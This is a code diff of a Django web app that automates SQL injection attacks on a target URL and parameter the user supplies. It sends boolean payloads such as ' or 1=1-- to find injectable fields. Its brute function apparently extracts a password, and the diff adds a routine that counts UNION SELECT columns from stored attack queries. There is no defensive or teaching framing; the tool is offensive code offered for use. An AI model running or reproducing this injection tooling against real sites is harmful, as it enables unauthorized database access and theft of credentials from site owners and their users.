@@ -11,7 +11,7 @@ def checkAttackAble(dicQuery):
     for i in range(1, 3):
         res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' and 1={i}-- "})
         result = findUserKeyword(res, dicQuery['find'])
-        print(result)
+
         if result[0] == 1:
             attack_querys += result[1] + '\n'
             start = "'"
@@ -21,6 +21,7 @@ def checkAttackAble(dicQuery):
         else:
             res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' or 1={i}-- "})
             result = findUserKeyword(res, dicQuery['find'])
+            print(result)
 
             if result[0] == 1:
                 attack_querys += result[1] + '\n'
@@ -58,7 +59,7 @@ def checkAttackAble(dicQuery):
             print(5, attack_querys, start)
             return 3, attack_querys, start
         else:
-            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' and 1={i}-- '})
+            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' or 1={i}-- '})
             result = findUserKeyword(res, dicQuery['find'])
 
         if result[0] == 1:
@@ -86,15 +87,22 @@ def retry(request):
         query = (request.POST.get("requery"))
         dicQuery = request.POST.get("origin")
         python_dict = literal_eval(dicQuery)
+        check_union ={'union', 'select'}
 
+        for i in check_union:
+            if i in query :
+                obj, is_created = list.objects.get_or_create(query=query,stand='union')
+                break
 
-        obj, is_created = list.objects.get_or_create(query=query)
+        else : obj, is_created = list.objects.get_or_create(query=query)
+
 
         a,testtest = exploit2(python_dict, obj)
         if(a == 1) :
             return render(request,'injection/result.html', {'ttt':testtest,'s':'1'})
         else :
             return render(request, 'injection/result.html', {'ttt': testtest, 'f': '1'})
+
 
 def brute(start,dicQuery,attack_querys):
     length = 0
@@ -150,12 +158,41 @@ def brute(start,dicQuery,attack_querys):
         return '', attack_querys
 
 
+
+def db_union(dicQuery):
+    db_union = list.objects.filter(stand='union')
+    db_len = list.objects.filter(stand='length')
+
+    print(db_union)
+    for i in db_union:
+        res = sendQuery(dicQuery, {dicQuery['name']: i})
+        result = findUserKeyword(res,dicQuery['find'])
+        if result[0] == 1 :
+            cnt = 1
+            while 1 :
+                print('cnt',cnt)
+                search = str(cnt)
+                if search in str(i):
+                    cnt += 1
+                else :
+                    return cnt - 1
+
+    return ''
+
+
+
+        
+
+
+
+
 def index(request):
     return render(request, 'injection/index.html', {})
 
 
 def main(request):
     user_query = {'url': '',  'cookie': '', 'name': '', 'method': '', 'parameter': '', 'find': ''}
+
 
     if request.method == 'POST':
         url = request.POST.get("url", False)
@@ -164,6 +201,10 @@ def main(request):
         name = request.POST.get("name", False)
         method = request.POST.get("method", False)
         parameter = request.POST.get("parameter", False)
+        range = request.POST.get("slider",False)
+
+        print(range)
+
 
         user_query['url'] = url
         user_query['cookie'] = cookie
@@ -176,7 +217,11 @@ def main(request):
         print('start',start)
         print('a', a)
         print('value', value)
-        pw, value = brute(start, user_query, value)
+        if a != -1 :
+            pw, value = brute(start, user_query, value)
+
+        column_cnt = db_union(user_query)
+
         # b,url = union(url, cookie, find, name, method, parameter, result,flag,start)
 
         List = list.objects.order_by()
@@ -184,13 +229,13 @@ def main(request):
         if (a >= -1):
             if (a == 1):
                 return render(request, 'injection/result.html',
-                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw})
+                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})
             elif (a == 2):
                 return render(request, 'injection/result.html',
-                              {'data': value, 'single': '1', 'origin': str(user_query), 'list': List})
+                              {'data': value, 'single': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})
             elif (a == 3):
                 return render(request, 'injection/result.html',
-                              {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List})
+                              {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt})
 
     else:
         return render(request, 'injection/index.html', {})
